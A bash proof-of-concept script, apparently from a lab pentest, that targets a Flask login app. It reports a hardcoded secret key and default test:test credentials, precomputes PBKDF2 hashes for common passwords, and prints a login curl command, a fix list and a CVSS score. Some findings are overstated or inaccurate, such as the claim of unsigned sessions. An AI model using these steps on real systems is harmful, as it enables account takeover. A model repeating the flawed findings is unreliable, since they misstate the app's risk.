#!/bin/bash
# Authentication Bypass POC Script
# Demonstrates session forgery and default credentials exploitation

echo "============================================================================"
echo "AUTHENTICATION BYPASS EXPLOIT - Flask Login Application"
echo "============================================================================"
echo ""

# Target configuration from source code analysis
SECRET_KEY="your_secret_key"
USERNAME="test"
PASSWORD="test"

echo "[*] Target Configuration:"
echo "    Application: Flask Login (Website Module)"
echo "    Endpoint: POST /login"
echo "    Secret Key (known): $SECRET_KEY"
echo ""

# Compute PBKDF2-HMAC-SHA256 hash
echo "[*] Computing PBKDF2-HMAC-SHA256 hash for credentials..."
echo "    Username: $USERNAME"
echo "    Password: $PASSWORD"
echo "    Iterations: 100000"
echo ""

# Python one-liner to compute hash
HASH=$(python3 -c "
import hashlib
password = '$PASSWORD'
secret = '$SECRET_KEY'
h = hashlib.pbkdf2_hmac('sha256', password.encode(), secret.encode(), 100000).hex()
print(h)
")

echo "[+] Computed Hash:"
echo "    $HASH"
echo ""

# Exploit method 1: Default credentials
echo "============================================================================"
echo "EXPLOIT 1: Default Credentials"
echo "============================================================================"
echo ""
echo "[*] Account: $USERNAME:$PASSWORD"
echo "[*] Status: EXISTS in database (hardcoded in __init__.py)"
echo "[+] Can login with these credentials directly"
echo ""

# Exploit method 2: Session Forgery
echo "============================================================================"
echo "EXPLOIT 2: Session Token Forgery with Known Secret Key"
echo "============================================================================"
echo ""
echo "[+] Flask Session Structure:"
echo "    {'username': '$USERNAME', 'password_hash': '$HASH'}"
echo ""
echo "[+] Exploit Steps:"
echo "    1. Access Flask application (requires /login endpoint)"
echo "    2. Submit POST /login with username='$USERNAME', password='$PASSWORD'"
echo "    3. Flask computes: hashlib.pbkdf2_hmac('sha256', password.encode(), secret_key.encode(), 100000)"
echo "    4. Stores in session: session['password_hash'] = (computed hash)"
echo "    5. verify_session() compares with database password hashed same way"
echo "    6. Since secret key is known, attacker can precompute valid hashes"
echo ""

# Exploit method 3: PBKDF2 Hash Cracking
echo "============================================================================"
echo "EXPLOIT 3: PBKDF2 Hash Cracking (with Known Secret Key)"
echo "============================================================================"
echo ""
echo "[*] Precomputed hashes for common passwords:"
echo "    (Using known secret key: $SECRET_KEY)"
echo ""

for password in "admin" "password" "test" "1234" "admin123" "password123"; do
    hash=$(python3 -c "import hashlib; h = hashlib.pbkdf2_hmac('sha256', '$password'.encode(), '$SECRET_KEY'.encode(), 100000).hex(); print(h)")
    echo "    $password -> $hash"
done

echo ""
echo "[+] Impact: With known secret key, attacker can:"
echo "    - Precompute hashes for any password"
echo "    - Create valid session tokens for any user"
echo "    - Bypass authentication completely"
echo ""

# Vulnerability summary
echo "============================================================================"
echo "VULNERABILITY ANALYSIS"
echo "============================================================================"
echo ""
echo "[CRITICAL] Found 4 Authentication Vulnerabilities:"
echo ""
echo "1. Hardcoded Secret Key"
echo "   Location: /app/website/app/__init__.py"
echo "   Code: app.secret_key = 'your_secret_key'"
echo "   Impact: Attacker knows the PBKDF2 salt"
echo "   CWE: CWE-321 (Hardcoded Cryptographic Key)"
echo "   CWE: CWE-798 (Hardcoded Credentials)"
echo ""
echo "2. Default Credentials"
echo "   Username: test"
echo "   Password: test"
echo "   Location: Database (see __init__.py:49-57)"
echo "   Impact: Can login as test user directly"
echo "   CWE: CWE-798 (Hardcoded Credentials)"
echo ""
echo "3. Weak Password Storage"
echo "   Issue: Passwords stored as plaintext in database"
echo "   Should: Be hashed server-side with unique salt"
echo "   Impact: If DB is compromised, all passwords exposed"
echo "   CWE: CWE-256 (Plaintext Storage of Password)"
echo ""
echo "4. Session Forgery"
echo "   Issue: Session only contains username and password_hash"
echo "   Issue: No HMAC or signature on session data"
echo "   Issue: No rate limiting on login attempts"
echo "   Impact: Attacker can forge valid sessions"
echo "   CWE: CWE-384 (Session Fixation)"
echo ""

echo "============================================================================"
echo "PROOF OF CONCEPT"
echo "============================================================================"
echo ""
echo "[+] Curl command to test login (if endpoint were accessible):"
echo "    curl -X POST http://localhost:32768/login \\"
echo "      -d 'username=$USERNAME&password=$PASSWORD' \\"
echo "      -H 'Content-Type: application/x-www-form-urlencoded' \\"
echo "      -c cookies.txt"
echo ""
echo "[+] Expected behavior when fixed:"
echo "    1. Use unique salt per user (not global secret key)"
echo "    2. Remove default credentials"
echo "    3. Implement rate limiting"
echo "    4. Use strong password hashing (bcrypt/argon2/scrypt)"
echo "    5. Sign/encrypt session data"
echo ""

echo "============================================================================"
echo "CVSS V3.1 SCORING"
echo "============================================================================"
echo ""
echo "Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
echo "Score: 9.8 CRITICAL"
echo ""
echo "Justification:"
echo "  - Network accessible (AV:N)"
echo "  - Low attack complexity (AC:L)"
echo "  - No privileges required (PR:N)"
echo "  - No user interaction needed (UI:N)"
echo "  - Impacts all users (S:U)"
echo "  - Complete confidentiality breach (C:H)"
echo "  - Complete integrity breach (I:H)"
echo "  - System can be unavailable (A:H)"
echo ""

